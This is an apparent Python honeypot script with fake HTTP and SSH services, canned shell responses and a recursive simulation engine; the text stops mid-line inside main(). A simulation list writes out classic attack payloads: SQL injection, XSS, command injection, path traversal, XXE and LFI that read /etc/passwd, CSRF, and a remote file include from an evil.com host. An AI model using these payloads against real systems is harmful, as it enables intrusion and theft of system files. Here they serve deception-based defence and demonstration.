#!/usr/bin/env python3
import base64, hashlib, json, logging, random, socket, sys, threading, time
from http.server import BaseHTTPRequestHandler, HTTPServer

# --------------------------
# Logging setup
# --------------------------
logging.basicConfig(
    level=logging.DEBUG,
    format="%(asctime)s %(levelname)s %(message)s",
    handlers=[logging.StreamHandler(sys.stdout)]
)
logger = logging.getLogger("honeypot")

# --------------------------
# Glyph lines (persona seeds)
# --------------------------
GLYPHS = [
    "If what you say, can it be real.",
    "Unless life causes the cosmos to spill.",
    "While take to life, as the eagles to see.",
    "Ensure a night that is most important to me.",
    "Def to the divide.",
    "Let all voice turn low.",
    "Illumighost nightmare.",
    "This is your home.",
]

# --------------------------
# Helpers
# --------------------------
def sha256_hex(s: str) -> str:
    return hashlib.sha256(s.encode()).hexdigest()

def b64_encode(s: str) -> str:
    return base64.b64encode(s.encode()).decode()

def random_sleep(min_s=0.2, max_s=2.0):
    t = round(random.uniform(min_s, max_s), 3)
    time.sleep(t)
    return t

def persona_banner(depth: int, svc: str) -> str:
    return f"[{svc}] {GLYPHS[depth % len(GLYPHS)]} (depth={depth})"

def system_response(cmd: str) -> str:
    responses = {
        "ls": "bin  boot  etc  home  tmp  var",
        "whoami": "guest",
        "uname -a": "Linux phantom 5.4.0-ghost #1 SMP x86_64 GNU/Linux",
        "cat /etc/passwd": "root:x:0:0:root:/root:/bin/bash\nguest:x:1000:1000::/home/guest:/bin/bash",
    }
    return responses.get(cmd.strip(), f"bash: {cmd.strip()}: command not found")

# --------------------------
# Recursive consequence engine (Top 10 features)
# --------------------------
def consequence(depth: int, svc: str, action: str, payload: str = None) -> dict:
    node = {
        "depth": depth,
        "svc": svc,
        "action": action,
        "glyph": GLYPHS[depth % len(GLYPHS)],
        "ts": int(time.time()*1000),
    }
    if payload:
        node["payload"] = payload

    # 1. Persona engine
    node["banner"] = persona_banner(depth, svc)

    # 2. Multi-protocol simulation
    node["protocols"] = ["http", "ssh"] if depth >= 1 else ["http"]

    # 3. High-interaction illusion
    if depth >= 2:
        node["illusion"] = "ephemeral container (simulated)"

    # 4. Lure content
    if depth >= 3:
        node["lure"] = f"fake_invoices_{depth}.zip"

    # 5. Telemetry
    node["sha256"] = sha256_hex(node["banner"])
    node["b64"] = b64_encode(json.dumps(node))

    # 6. Threat intel enrichment (mocked)
    if depth >= 4:
        node["intel"] = {"asn": "AS12345", "geo": "US", "attck": "T1110"}

    # 7. Adaptive dialog
    if depth >= 5:
        node["dialog"] = random.choice(["slow", "error", "typo"])

    # 8. Sandbox detonation
    if depth >= 6:
        node["sandbox"] = "payload captured (simulated)"

    # 9. Policy envelope
    if depth >= 7:
        node["policy"] = {"outbound": "deny", "allow_cmds": ["ls","cat","whoami"]}

    # 10. Sales/demo packaging
    if depth >= 8:
        node["kpi"] = {"engagement_time": random.randint(1,300), "persona_shifts": depth}

    # Recurse until max depth
    if depth < 9:
        node["child"] = consequence(depth+1, svc, action, payload)
    return node

# --------------------------
# Vulnerability Simulation Payloads
# --------------------------
def vuln_sims():
    return [
        ("SQL Injection", "http", "GET /login", "admin' OR '1'='1 --"),
        ("XSS", "http", "GET /search", "<script>alert('xss')</script>"),
        ("Command Injection", "http", "POST /ping", "127.0.0.1; cat /etc/passwd"),
        ("Path Traversal", "http", "GET /download", "../../../../etc/passwd"),
        ("Buffer Overflow", "ssh", "login attempt", "A"*1024),
        ("Unicode Bypass", "http", "GET /login", "%u0027admin%u0027"),
        ("LFI", "http", "GET /index.php?page=", "../../../../../etc/passwd"),
        ("RFI", "http", "GET /index.php?page=", "http://evil.com/shell.txt"),
        ("XXE", "http", "POST /xml", """<?xml version="1.0"?><!DOCTYPE foo [ <!ELEMENT foo ANY >
<!ENTITY xxe SYSTEM "file:///etc/passwd"> ]><foo>&xxe;</foo>"""),
        ("CSRF", "http", "GET /transfer", "<img src='http://target/transfer?amount=1000&to=attacker'>"),
    ]

# --------------------------
# HTTP Shim
# --------------------------
class Handler(BaseHTTPRequestHandler):
    def do_GET(self):
        depth = int(self.headers.get("X-Depth", "0"))
        node = consequence(depth, "http", "GET")
        body = json.dumps(node)
        b64 = b64_encode(body)
        random_sleep()
        self.send_response(200)
        self.send_header("Content-Type", "application/json")
        self.end_headers()
        self.wfile.write(json.dumps({"transport_b64": b64}).encode())

def serve_http(port=8080):
    logger.info(f"HTTP honeypot listening on {port}")
    HTTPServer(("", port), Handler).serve_forever()

# --------------------------
# SSH Shim
# --------------------------
def serve_ssh(port=2222):
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.bind(("", port)); s.listen(5)
    logger.info(f"SSH honeypot listening on {port}")
    while True:
        conn, addr = s.accept()
        threading.Thread(target=handle_ssh, args=(conn, addr), daemon=True).start()

def handle_ssh(conn, addr):
    depth = random.randint(0, len(GLYPHS)-1)
    node = consequence(depth, "ssh", "connect")
    banner = node["banner"]
    conn.sendall((banner + "\nlogin: ").encode())
    user = conn.recv(64).decode().strip()
    random_sleep()
    conn.sendall(b"password: ")
    pwd = conn.recv(64).decode().strip()
    random_sleep()
    conn.sendall(f"Welcome {user}. Type commands.\n".encode())

    try:
        while True:
            conn.sendall(b"$ ")
            cmd = conn.recv(128).decode().strip()
            if not cmd or cmd.lower() in ("exit", "quit"):
                conn.sendall(b"logout\n")
                break
            random_sleep(0.5, 2.0)
            resp = system_response(cmd)
            conn.sendall((resp + "\n").encode())
    except Exception as e:
        logger.warning(f"SSH session error: {e}")
    finally:
        conn.close()

# --------------------------
# Simulation Harness
# --------------------------
SIMS = [
    ("scanner", "http", "GET /index.html", None),
    ("spray", "ssh", "login attempt", None),
    ("kiddie", "http", "GET /admin", None),
    ("persistence", "ssh", "reconnect", None),
    ("lure", "http", "GET /invoices.zip", None),
    ("ics", "http", "GET /modbus/40001", None),
    ("cloud", "http", "GET /latest/meta-data/", None),
    ("botnet", "http", "POST /ping", None),
    ("redteam", "ssh", "login + exit", None),
    ("timewarp", "ssh", "ls; sleep; whoami", None),
] + vuln_sims()

def run_sims():
    for i, (name, svc, action, payload) in enumerate(SIMS):
        print(f"\n=== SIM {i+1}: {name.upper()} ===")
        node = consequence(i, svc, action, payload)
        print(json.dumps(node, indent=2))
        time.sleep(1)

# --------------------------
# Runner
# --------------------------
def main():
    # Start honeypot services
    threading.Thread(target=serve_http,
